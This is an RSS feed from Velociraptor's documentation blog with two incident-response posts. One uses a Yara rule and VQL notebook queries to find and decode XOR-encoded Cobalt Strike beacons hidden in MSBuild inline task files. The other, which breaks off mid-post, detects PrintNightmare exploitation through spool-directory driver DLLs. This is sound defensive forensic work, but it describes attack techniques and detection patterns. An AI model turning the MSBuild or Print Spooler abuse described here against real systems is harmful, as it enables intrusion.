<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Vql on Velociraptor - Digging deeper!</title><link>https://docs.velociraptor.app/tags/vql/</link><description>Recent content in Vql on Velociraptor - Digging deeper!</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Tue, 14 Oct 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://docs.velociraptor.app/tags/vql/index.xml" rel="self" type="application/rss+xml"/><item><title>Cobalt Strike payload discovery and data manipulation in VQL</title><link>https://docs.velociraptor.app/blog/2021/2021-11-09-vql-data-manipulation/</link><pubDate>Tue, 09 Nov 2021 04:54:00 +0000</pubDate><guid>https://docs.velociraptor.app/blog/2021/2021-11-09-vql-data-manipulation/</guid><description>&lt;p>Velociraptor’s ability for data manipulation is a core platform capability
that drives a lot of the great content we have available in terms of data
parsing for artifacts and live analysis. After a recent engagement with
less common encoded Cobalt Strike beacons, and finding sharable files on
VirusTotal, I thought it would be a good opportunity to walk through some
workflow around data manipulation with VQL for analysis. In this post I
will walk though some background, collection at scale, and finally talk
about processing target files to extract key indicators.&lt;/p>
&lt;h2 id="background">Background&lt;/h2>
&lt;p>The Microsoft Build Engine (MSBuild.exe) is a signed Windows binary that
can be used to load C# or Visual Basic code via an inline task project
file. Legitimately used in Windows software development, it can handle XML
formatted task files that define requirements for loading and building
Visual Studio configurations. Adversaries can abuse this mechanism for
execution as defence evasion and to bypass application whitelisting -
&lt;a href="https://attack.mitre.org/techniques/T1127/001/" target="_blank" >ATT&amp;amp;CK T1127&lt;/a>
.&lt;/p>
&lt;p>In this particular engagement, the Rapid7 MDR/IR team responded to an
intrusion in which during lateral movement, the adversary dropped many
variants of an MSBuild inline task file to several machines and then
executed MSBuild via wmi to load an embedded Cobalt Strike beacon.
Detecting an in memory Cobalt Strike beacon is trivial for active threats
with our process based yara and carving content.&lt;/p>
&lt;p>The problem in this case was: how do you discover, then decode these encoded
files on disk quickly to find any additional scope using Velociraptor?&lt;/p>
&lt;h2 id="collection">Collection&lt;/h2>
&lt;p>First task is discovery and collecting our files in scope from the network.
Typically this task may be slow to deploy or rely on cobbled together
capabilities from other teams. The Velociraptor hunt is an easy button for
this use case.&lt;/p>
&lt;p>











&lt;figure id="ee679eeaf193b08a0f915ba1ad72527f">
 &lt;div data-featherlight="#ee679eeaf193b08a0f915ba1ad72527f" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-11-09-vql-data-manipulation/01_new_hunt.png" alt="Velociraptor GUI : hunt : add hunt">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="01_new_hunt.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Velociraptor GUI : hunt : add hunt
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>Velociraptor has several valuable artifacts for hunting over Windows file
systems with yara: &lt;code>Windows.Detection.Yara.NTFS&lt;/code> and &lt;code>Generic.Detection.Yara.Glob&lt;/code>
spring to mind readily. In this instance I am selecting Yara.NTFS. I have
leveraged this artifact in the field for hunting malware, searching logs or
any other capability where both metadata and content based discovery is desired.&lt;/p>

&lt;div class="mynotices tip">
 &lt;div heading=" Windows.Detection.Yara.NTFS ">&lt;ul>
&lt;li>This artifact searches the MFT, returns a list of target files then runs Yara over the target list.&lt;/li>
&lt;li>The artifact leverages &lt;code>Windows.NTFS.MFT&lt;/code> so similar regex filters can be applied including Path, Size and date.&lt;/li>
&lt;li>The artifact also has an option to search across all attached drives and upload any files with Yara hits.&lt;/li>
&lt;/ul>
&lt;p>Some examples of path regex may include:&lt;/p>
&lt;ul>
&lt;li>Extension at a path: &lt;code>Windows/System32/.+\\.dll$&lt;/code>&lt;/li>
&lt;li>More wildcards: &lt;code>Windows/.+/.+\\.dll$&lt;/code>&lt;/li>
&lt;li>Specific file: &lt;code>Windows/System32/kernel32\.dll$&lt;/code>&lt;/li>
&lt;li>Multiple extensions: &lt;code>\.(php|aspx|resx|asmx)$&lt;/code>&lt;/li>
&lt;/ul>
&lt;/div>
&lt;/div>


&lt;p>











&lt;figure id="93f6d827c4c3491cceee8665f9904590">
 &lt;div data-featherlight="#93f6d827c4c3491cceee8665f9904590" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-11-09-vql-data-manipulation/02_find_artifact.png" alt="Select artifact : Windows.Detection.Yara.NTFS">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="02_find_artifact.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Select artifact : Windows.Detection.Yara.NTFS
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>The file filter: &lt;code>Windows/Temp/[^/]*\.TMP$&lt;/code> will suffice in this case to target
our adversaries path for payloads before applying our yara rule. Typically when
running discovery like this, an analyst can also apply additional options like
file size or time stamp bounds for use at scale and optimal performance.
The yara rule deployed in this case was simply quick and dirty hex conversion of
text directly from the project file referencing the unique variable setup that
was common across acquired samples.&lt;/p>
&lt;pre>&lt;code class="language-yara">rule MSBuild_buff {
 meta:
 description = &amp;quot;Detect unique variable setup MSBuild inline task project file&amp;quot;
 author = &amp;quot;Matt Green - @mgreen27&amp;quot;
 date = &amp;quot;2021-10-22&amp;quot;
 strings:
 // byte[] buff = new byte[]
 $buff = { 62 79 74 65 5b 5d 20 62 75 66 66 20 3d 20 6e 65 77 20 62 79 74 65 5b 5d }

 // byte[] key_code = new byte[]
 $key_code = { 62 79 74 65 5b 5d 20 6b 65 79 5f 63 6f 64 65 20 3d 20 6e 65 77 20 62 79 74 65 5b 5d }

condition:
 any of them
}
&lt;/code>&lt;/pre>
&lt;p>











&lt;figure id="814a3690dd95bed896fd195e2e9b4a44">
 &lt;div data-featherlight="#814a3690dd95bed896fd195e2e9b4a44" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-11-09-vql-data-manipulation/03_configure_artifact.png" alt="Windows.Detection.Yara.NTFS hunt configuration">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="03_configure_artifact.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Windows.Detection.Yara.NTFS hunt configuration
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>After launching the hunt, results become available inside the hunt entry on the
Velociraptor server for download or additional analysis.&lt;/p>
&lt;p>











&lt;figure id="cc2577f1ee0ebd3ff5decabdffe65090">
 &lt;div data-featherlight="#cc2577f1ee0ebd3ff5decabdffe65090" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-11-09-vql-data-manipulation/04_hunt_results.png" alt="Hunt results">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="04_hunt_results.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Hunt results
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;h2 id="payload-decode">Payload decode&lt;/h2>
&lt;p>The Cobalt Strike payload is a string with represented characters xor encoded
as a hex formatted buffer and key in embedded C Sharp code as seen below.&lt;/p>
&lt;p>











&lt;figure id="d3b60f386ce841d16376135ff619d807">
 &lt;div data-featherlight="#d3b60f386ce841d16376135ff619d807" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-11-09-vql-data-manipulation/05_payload_b.png" alt="MSBuild inline task project file with CobaltStrike payload">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="05_payload_b.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 MSBuild inline task project file with CobaltStrike payload
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;h3 id="enumerate-collected-files-and-find-location-on-server">Enumerate collected files and find location on server&lt;/h3>
&lt;p>So far we have only collected files that have suspicious content. Now we want
to post process the result and try to extract more information from the payload.&lt;/p>

&lt;div class="mynotices tip">
 &lt;div heading=" Velociraptor notebook ">&lt;p>The Velociraptor notebook is a gui component that lets the user run VQL directly
on the server. In this case we are leveraging the notebook attached to our hunt
to post process results opposed to downloading the files and processing offline.&lt;/p>
&lt;/div>
&lt;/div>


&lt;p>Our first step of decode is to examine all the files we collected in the hunt.
The first query enumerates all the individual collections in the hunt, while the
second query retrieves the files collected for each job.&lt;/p>
&lt;pre>&lt;code class="language-vql">-- find flow ids for each client
LET hunt_flows = SELECT *, Flow.client_id as ClientId, Flow.session_id as FlowId
FROM hunt_flows(hunt_id='H.C6508PLOOPD2U')

-- extract uploaded files and path on server
Let targets = SELECT * FROM foreach(row=hunt_flows,
 query={
 SELECT
 file_store(path=vfs_path) as SamplePath,
 file_size as SampleSize
 FROM uploads(client_id=ClientId,flow_id=FlowId)
 })

SELECT * FROM targets
&lt;/code>&lt;/pre>
&lt;p>











&lt;figure id="3f50ada340e903fbbcc22a8bea8cad4f">
 &lt;div data-featherlight="#3f50ada340e903fbbcc22a8bea8cad4f" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-11-09-vql-data-manipulation/06_notebook_files.png" alt="Find the location of all files collected">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="06_notebook_files.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Find the location of all files collected
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;h3 id="extract-encoded-payload-and-xor-key">Extract encoded payload and xor key&lt;/h3>
&lt;p>For the second step, to extract target bytes we leverage the &lt;code>parse_records_with_regex()&lt;/code>
plugin to extract the strings of interest (Data and Key) in our target files.
Note: the buffer_size argument allows VQL to examine a larger buffer than the
default size in order to capture the typically very large payloads in these build
files. We have also included a 200 character limitation on the data field initially
as this will improve performance when working on VQL. We have also specified buffer
size to be larger than default and just larger than the biggest payload in scope.&lt;/p>
&lt;pre>&lt;code class="language-vql">-- regex to extract Data and Key fields
LET target_regex = 'buff = new byte\\[\\]\\s*{(?P&amp;lt;Data&amp;gt;[^\\n]*)};\\s+byte\\[\\]\\s+key_code = new byte\\[\\]\\s*{(?P&amp;lt;Key&amp;gt;[^\\n]*)};\\n'

SELECT * FROM foreach(row=targets,
 query={
 SELECT
 basename(path=SamplePath) as Sample,
 SampleSize,
 Key, --obtained from regex
 read_file(filename=Data,accessor='data',length=200) as DataExtract -- obtained by regex, only output 200 characters
 FROM parse_records_with_regex(
 file=SamplePath,buffer_size=15000000,
 regex=target_regex)
 })
&lt;/code>&lt;/pre>

&lt;div class="mynotices tip">
 &lt;div heading=" Parse records with regex ">&lt;p>&lt;code>parse_records_with_regex()&lt;/code> is a VQL plugin that parses a file with a set of regexp and yields matches as records. The file is read into a large buffer. Then each regular expression is applied to the buffer, and all matches are emitted as rows.&lt;/p>
&lt;p>The regular expressions are specified in the Go syntax. They are expected to contain capture variables to name the matches extracted.&lt;/p>
&lt;p>The aim of this plugin is to split the file into records which can be further parsed. For example, if the file consists of multiple records, this plugin can be used to extract each record, while &lt;code>parse_string_with_regex()&lt;/code> can be used to further split each record into elements. This works better than trying to write a more complex regex which tries to capture a lot of details in one pass.&lt;/p>
&lt;/div>
&lt;/div>


&lt;p>











&lt;figure id="4633b91489ef66189b2a7d05196f7651">
 &lt;div data-featherlight="#4633b91489ef66189b2a7d05196f7651" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-11-09-vql-data-manipulation/07_notebook_regex.png" alt="VQL: extract data and keys">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="07_notebook_regex.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 VQL: extract data and keys
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;h3 id="extract-normalisation">Extract normalisation&lt;/h3>
&lt;p>The third step adds a custom function for hex normalisation and converts the inline
C Sharp style encoding to a standard hex encoded string which VQL can easily parse.
In this case, the local normalise function will ensure we have valid 2 character hex.
The &lt;code>regex_replace()&lt;/code> will strip the leading &amp;lsquo;0x&amp;rsquo; from the hex strings and prepare for
xor processing.&lt;/p>
&lt;pre>&lt;code class="language-vql">-- regex to extract Data and Key fields
LET target_regex = 'buff = new byte\\[\\]\\s*{(?P&amp;lt;Data&amp;gt;[^\\n]*)};\\s+byte\\[\\]\\s+key_code = new byte\\[\\]\\s*{(?P&amp;lt;Key&amp;gt;[^\\n]*)};\\n'

-- normalise function to fix bad hex strings
LET normalise_hex(value) = regex_replace(source=value,re='0x(.)[,}]',replace='0x0\$1,')

SELECT * FROM foreach(row=targets,
 query={
 SELECT
 basename(path=SamplePath) as Sample,
 SampleSize,
 regex_replace(re=&amp;quot;0x|,&amp;quot;, replace=&amp;quot;&amp;quot;, source=normalise_hex(value=Key)) as KeyNormalised,
 regex_replace(re=&amp;quot;0x|,&amp;quot;, replace=&amp;quot;&amp;quot;, source=normalise_hex(value=Data)) as DataNormalised
 FROM parse_records_with_regex(
 file=SamplePath,buffer_size=15000000,
 regex=target_regex)
 })
&lt;/code>&lt;/pre>
&lt;p>











&lt;figure id="cb8e16046aee3529d635f9f5aeb5296f">
 &lt;div data-featherlight="#cb8e16046aee3529d635f9f5aeb5296f" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-11-09-vql-data-manipulation/08_notebook_normalise.png" alt="VQL: hex normalisation">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="08_notebook_normalise.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 VQL: hex normalisation
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;h3 id="extract-to-bytes">Extract to bytes&lt;/h3>
&lt;p>The fourth step converts hex to bytes and validates that the next stage is working. In the example VQL below
we pass the hex text to the &lt;code>unhex()&lt;/code> function to produce raw bytes for our variables.&lt;/p>
&lt;pre>&lt;code class="language-vql">SELECT * FROM foreach(row=targets,
 query={
 SELECT
 basename(path=SamplePath) as Sample,
 SampleSize,
 unhex(string=regex_replace(re=&amp;quot;0x|,&amp;quot;, replace=&amp;quot;&amp;quot;, source=normalise_hex(value=Key))) as KeyBytes,
 read_file(filename=
 unhex(string=regex_replace(re=&amp;quot;0x|,&amp;quot;, replace=&amp;quot;&amp;quot;, source=normalise_hex(value=Data))),
 accessor='data',length=200) as DataBytesExtracted
 FROM parse_records_with_regex(
 file=SamplePath,buffer_size=15000000,
 regex=target_regex)
 })
&lt;/code>&lt;/pre>
&lt;p>











&lt;figure id="969e29f786572e97d9206d0aac70db89">
 &lt;div data-featherlight="#969e29f786572e97d9206d0aac70db89" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-11-09-vql-data-manipulation/09_notebook_bytes.png" alt="VQL: extract bytes">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="09_notebook_bytes.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 VQL: extract bytes
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;h3 id="xor-decode">Xor decode&lt;/h3>
&lt;p>VQL&amp;rsquo;s flexibility comes with its ability to reuse existing artifacts in different ways.
The fifth step is running Velociraptor’s &lt;code>xor()&lt;/code> function and piping the output into our
the existing &lt;code>Windows.Carving.CobaltStrike()&lt;/code> configuration decoder.&lt;/p>
&lt;pre>&lt;code class="language-vql">-- extract bytes
LET bytes &amp;lt;= SELECT * FROM foreach(row=targets,
 query={
 SELECT
 SamplePath, basename(path=SamplePath) as Sample, SampleSize,
 unhex(string=regex_replace(re=&amp;quot;0x|,&amp;quot;, replace=&amp;quot;&amp;quot;, source=normalise_hex(value=Key))) as KeyBytes,
 read_file(filename=
 unhex(string=regex_replace(re=&amp;quot;0x|,&amp;quot;, replace=&amp;quot;&amp;quot;, source=normalise_hex(value=Data))),
 accessor='data') as DataBytes
 FROM parse_records_with_regex(
 file=SamplePath,buffer_size=15000000,
 regex=target_regex)
 })

-- pass bytes to cobalt strike parser and format key indicators im interested in
SELECT *, FROM foreach(row=bytes,query={
 SELECT *,
 basename(path=SamplePath) as Sample,SampleSize
 FROM Artifact.Windows.Carving.CobaltStrike(TargetBytes=xor(key=KeyBytes,string=DataBytes))
})
&lt;/code>&lt;/pre>
&lt;p>











&lt;figure id="d4add562a61558278b9c9ab194d0e575">
 &lt;div data-featherlight="#d4add562a61558278b9c9ab194d0e575" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-11-09-vql-data-manipulation/10_notebook_parse.png" alt="VQL: parse config">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="10_notebook_parse.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 VQL: parse config
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>Decoded Cobalt Strike configuration is clearly observed.&lt;/p>
&lt;p>











&lt;figure id="17de019bc45650fe7a7dfa21f611f268">
 &lt;div data-featherlight="#17de019bc45650fe7a7dfa21f611f268" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-11-09-vql-data-manipulation/11_notebook_config_example.png" alt="Cobalt strike configuration example">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="11_notebook_config_example.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Cobalt strike configuration example
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>The smallest file also includes a Cobalt Strike shellcode stager, which I have recently
added to the Velociraptor Cobalt Strike parser.&lt;/p>
&lt;p>











&lt;figure id="bafab20256d8f473d1a2252f8fcc075f">
 &lt;div data-featherlight="#bafab20256d8f473d1a2252f8fcc075f" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-11-09-vql-data-manipulation/12_notebook_shellcode_example.png" alt="Cobalt strike shellcode example">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="12_notebook_shellcode_example.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Cobalt strike shellcode example
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;h3 id="additional-analysis">Additional analysis&lt;/h3>
&lt;p>Finally, we may have a desire to extract specific key indicators and compare across
samples. A simple data stack on key indicators of interest.&lt;/p>
&lt;pre>&lt;code class="language-vql">-- pass bytes to cobalt strike parser and format key indicators im interested in
LET cobalt = SELECT *, FROM foreach(row=bytes,query={
 SELECT
 basename(path=SamplePath) as Sample,SampleSize,
 Hash as DecodeHash,
 Rule,Offset,Xor,DecodedConfig
 FROM Artifact.Custom.Windows.Carving.CobaltStrike(TargetBytes=xor(key=KeyBytes,string=DataBytes))
})

-- quick data stack on a few things to show sample analysis
SELECT count() as Total,
 if(condition= Xor=~'^0x(2e|69)$', then=DecodedConfig.BeaconType, else= 'Shellcode stager') as Type,
 if(condition= Xor=~'^0x(2e|69)$', then=DecodedConfig.LicenseId, else= DecodedConfig.Licence) as License,
 if(condition= Xor=~'^0x(2e|69)$', then=dict(SpawnTox86=DecodedConfig.SpawnTox86,SpawnTox64=DecodedConfig.SpawnTox64), else= 'N/A') as SpawnTo,
 if(condition= Xor=~'^0x(2e|69)$', then=DecodedConfig.Port, else= 'N/A') as Port,
 if(condition= Xor=~'^0x(2e|69)$', then=DecodedConfig.C2Server, else= DecodedConfig.Server) as Server
FROM cobalt
GROUP BY Type, Licence,SpawnTo,Port,Server
&lt;/code>&lt;/pre>
&lt;p>











&lt;figure id="ff3510a66310692294d31fc40e2b6416">
 &lt;div data-featherlight="#ff3510a66310692294d31fc40e2b6416" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-11-09-vql-data-manipulation/13_notebook_example.png" alt="VQL results: key indicators of interest">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="13_notebook_example.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 VQL results: key indicators of interest
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;h2 id="conclusions">Conclusions&lt;/h2>
&lt;p>In this post we showed discovery, then decode of encoded Cobalt Strike beacons on disk.
Velociraptor can read, manipulate and enrich data efficiently across a large network
without the overhead of needing to extract and process manually.&lt;/p>
&lt;p>Whilst most traditional workflows concentrate on collection and offline analysis,
Velociraptor notebook also enables data manipulation and flexibility in analysis.
If you would like to try out these features in Velociraptor, It is available on
&lt;a href="https://github.com/Velocidex/velociraptor" target="_blank" >GitHub&lt;/a>
 under an open source license. As
always, please file issues on the bug tracker or ask questions on our mailing list
&lt;a href="mailto:velociraptor-discuss@googlegroups.com" >velociraptor-discuss@googlegroups.com&lt;/a>
. You can also chat with us directly on discord
at &lt;a href="https://www.velocidex.com/discord" target="_blank" >https://www.velocidex.com/discord&lt;/a>
.&lt;/p>
&lt;h2 id="references">References&lt;/h2>
&lt;ol>
&lt;li>&lt;a href="https://attack.mitre.org/techniques/T1127/001/" target="_blank" >MITRE ATT&amp;amp;CK T1127.001 - Trusted Developer Utilities Proxy Execution: MSBuild&lt;/a>
&lt;/li>
&lt;li>&lt;a href="https://github.com/3gstudent/msbuild-inline-task" target="_blank" >MSBuild Inline Task template&lt;/a>
&lt;/li>
&lt;li>&lt;a href="https://www.virustotal.com/gui/file/cf54b9078d63eaeb0300e70d0ef6cf4d3a4d83842fe08cb951f841549663e1e2" target="_blank" >VirusTotal sample - &lt;code>I20xQy.TMP&lt;/code>&lt;/a>
&lt;/li>
&lt;li>&lt;a href="https://www.virustotal.com/gui/file/52ade62a412fed9425b75610620c85d9c143593cd50c2269066b120ac05dc8c3" target="_blank" >VirusTotal sample - &lt;code>CSLHP.TMP&lt;/code>&lt;/a>
&lt;/li>
&lt;li>&lt;a href="https://www.virustotal.com/gui/file/b4ede02ea3c198f5e7d3fbab3cadc1266538d23a43a2825ece7d4c75b7208fa9" target="_blank" >VirusTotal sample - &lt;code>ddppllkm.TMP&lt;/code>&lt;/a>
&lt;/li>
&lt;li>&lt;a href="https://www.virustotal.com/gui/file/152722a89fd87ecdf73fd18558622f22f980bddd6928cad31859453d41f7b8dd" target="_blank" >VirusTotal sample - &lt;code>gujf2z0z.0.cs.TMP&lt;/code>&lt;/a>
&lt;/li>
&lt;li>&lt;a href="https://www.virustotal.com/gui/file/78d2078c4e740aff4a2a289387ba8cfc1de6c02ed48c4c65b53582303192dab2" target="_blank" >VirusTotal sample - &lt;code>Ofeq81u.TMP&lt;/code>&lt;/a>
&lt;/li>
&lt;li>&lt;a href="https://www.virustotal.com/gui/file/507f988ab1f8229e84bb83dcb5a896b1747957b998aad7c7ccdd301096726999" target="_blank" >VirusTotal sample - &lt;code>zzyhukwK.TMP&lt;/code>&lt;/a>
&lt;/li>
&lt;/ol></description></item><item><title>Velociraptor vs Printnightmare</title><link>https://docs.velociraptor.app/blog/2021/2021-07-12-velociraptor-vs-printnightmare/</link><pubDate>Sun, 11 Jul 2021 18:13:50 +0000</pubDate><guid>https://docs.velociraptor.app/blog/2021/2021-07-12-velociraptor-vs-printnightmare/</guid><description>&lt;h2 id="hunting-a-zero-day">Hunting a Zero day!&lt;/h2>
&lt;p>Velociraptor is an advanced open source endpoint visibility framework
based on a flexible query language called
&lt;a href="https://docs.velociraptor.app/docs/vql/" target="_blank" >VQL&lt;/a>
. What makes
Velociraptor unique from other endpoint tools is the flexibility to
develop new queries to address emerging threats.&lt;/p>
&lt;p>This post walks through a common use case for Velociraptor’s VQL:
detecting exploitation of a new zero day (A newly announced
vulnerability without a patch available). Once a zero day has been
announced, time is of the essence! Defenders must scramble to
determine possible remediations and detect exploitation on their
network.&lt;/p>
&lt;p>This is when Velociraptor’s quick and flexible approach shines: As
defenders we can develop a query to detect past exploitation of the
vulnerability, ensure hardening or patching has been applied to
prevent future exploitation. Additionally, Velociraptor provides a
mechanism for ongoing real-time monitoring using VQL queries,
therefore allowing us to use it for real time detection or future
attacks.&lt;/p>
&lt;h2 id="background">Background&lt;/h2>
&lt;p>On the 29th of June a POC exploit for a critical vulnerability was
accidentally released by a researcher that targeted the Microsoft
Print Spooler service. The “PrintNightmare” vulnerability
(CVE-2021-&lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675" target="_blank" >1675&lt;/a>
/&lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527" target="_blank" >34527&lt;/a>
 ), could be used to remotely compromise a Windows
system with SYSTEM privileges. While a patch was initially released
during the June 8 patch cycle, security researchers quickly discovered
it was incomplete and exploitation was still available on fully
patched windows hosts.&lt;/p>
&lt;p>At this time, we wanted to rapidly develop a VQL query that would
indicate if any endpoint had been exploited through this vector. Our
first task was to learn more about the issue and particularly try to
understand what Digital Forensic artifacts were left behind on the
system after a successful exploitation attempt.&lt;/p>
&lt;p>While many other researchers were focusing solely on windows event
logs, Velociraptor provides access to many more forensically
significant artifacts, because it is running on the endpoint. This
allows us to explore a richer and more accurate set of artifacts in
order to detect exploitation attempts.&lt;/p>
&lt;h2 id="exploitation">Exploitation&lt;/h2>
&lt;p>We will first begin by replicating the issue using a couple of the
open source POC exploits. For our testing we used the MimiKatz
PrintNightmare capability and a local privilege escalation powershell
POC available here.&lt;/p>
&lt;p>











&lt;figure id="13f7730993133e2e8bc6a2152e6e1707">
 &lt;div data-featherlight="#13f7730993133e2e8bc6a2152e6e1707" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-07-12-velociraptor-vs-printnightmare/image9.png" alt="Mimikatz PrintNightmare">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="image9.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Mimikatz PrintNightmare
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>











&lt;img class="inline" src="image2.png" />




&lt;/p>
&lt;p>An excellent walk through of the vulnerability can be found &lt;a href="https://www.kb.cert.org/vuls/id/383432" target="_blank" >here&lt;/a>
 and
&lt;a href="https://www.rapid7.com/blog/post/2021/06/30/cve-2021-1675-printnightmare-patch-does-not-remediate-vulnerability/" target="_blank" >here&lt;/a>
, but what does the exploit actually do?&lt;/p>
&lt;ol>
&lt;li>Attackers connect to the Print Spooler Service by sending a request to add a printer using a windows API (AddPrinterDriverEx) over SMB, or RPC.&lt;/li>
&lt;/ol>
&lt;p>











&lt;img class="inline" src="image7.png" />




&lt;/p>
&lt;ol start="2">
&lt;li>When installing a new “print driver” the attacker can configure several module paths and configuration inside pDriverContainer and these paths are copied to the print spool folder during installation.&lt;/li>
&lt;/ol>
&lt;p>











&lt;img class="inline" src="image1.png" />




&lt;/p>
&lt;ol start="3">
&lt;li>Some of the POC variations copied files in slightly different ways but each ended up with an attacker controlled module being executed by the spoolsv.exe as a driver datafile, enabling the Remote Code Execution or Local Privilege Elevation.&lt;/li>
&lt;/ol>
&lt;p>We can use Procmon to see what files were modified on the system.&lt;/p>
&lt;p>











&lt;img class="inline" src="image3.png" />




&lt;/p>
&lt;p>So a successful exploit results in the copying of a new dll into the
spool directory and the dll being loaded by the spoolsv.exe service
process.&lt;/p>
&lt;h3 id="detecting-new-files-in-the-spool-directory">Detecting new files in the spool directory.&lt;/h3>
&lt;p>As a first iteration, let&amp;rsquo;s use Velociraptor to recursively list all
the binaries in the spool/drivers directory. We can use the regular OS
APIs to list the directory, but in our case we will scan the entire
filesystem by parsing the NTFS internal structures (Analysis of the
NTFS may even reveal presently deleted files).&lt;/p>
&lt;p>











&lt;img class="inline" src="image4.png" />




&lt;/p>
&lt;p>The above query parses the entire master file table (MFT) and returns
information about those files in the spool directory.&lt;/p>
&lt;p>











&lt;figure id="f508b5059efcee6e9724be365a2a9c7f">
 &lt;div data-featherlight="#f508b5059efcee6e9724be365a2a9c7f" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-07-12-velociraptor-vs-printnightmare/image6.png" alt="PE listing in Windows\System32\spool\drivers**">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="image6.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 PE listing in Windows\System32\spool\drivers**
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>While the proof of concept malicious drivers are immediately
recognizable by name (mimilib.dll and nightmare.dll) we don&amp;rsquo;t want to
rely on name alone since that is easily changed by a real
attacker. Let’s add to this query some more information about the
executable file itself, such as PE attributes (like export table,
import tables) hashes and specifically, if the file is signed or not
(i.e. its authenticode signature verification). An &lt;a href="https://gist.github.com/scudette/e24c32528b4aee679209b688afa40839" target="_blank" >example query&lt;/a>
 is shown below.&lt;/p>
&lt;p>











&lt;figure id="b21b785631590bb85207ba13639acc0a">
 &lt;div data-featherlight="#b21b785631590bb85207ba13639acc0a" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-07-12-velociraptor-vs-printnightmare/image12.png" alt="">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="image12.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>The additional information about any modules found is critical in
allowing analysts to quickly discount legitimate binaries and speed up
the triage process.&lt;/p>
&lt;p>











&lt;figure id="3581079411d70cfd95b918ba98ce1cf5">
 &lt;div data-featherlight="#3581079411d70cfd95b918ba98ce1cf5" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-07-12-velociraptor-vs-printnightmare/image10.png" alt="Mimikatz payload: PE attributes and authenticode">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="image10.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Mimikatz payload: PE attributes and authenticode
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>In the example above, we can see the Mimikatz exploit loads the
mimikatz DLL into the spools directory. The DLL is easily recognizable
by its authenticode signature which in most environments would
immediately designate it as suspicious.&lt;/p>
&lt;p>We can also view obvious malicious PE exports or similarly, an absence
of print function related imports as a good signal that the binary is
not a legitimate printer driver. Finally time based filters for the
time period of exposure can be used as data points for potential
exploitation.&lt;/p>
&lt;p>The Mimikatz POC loaded a signed component, but many other exploits
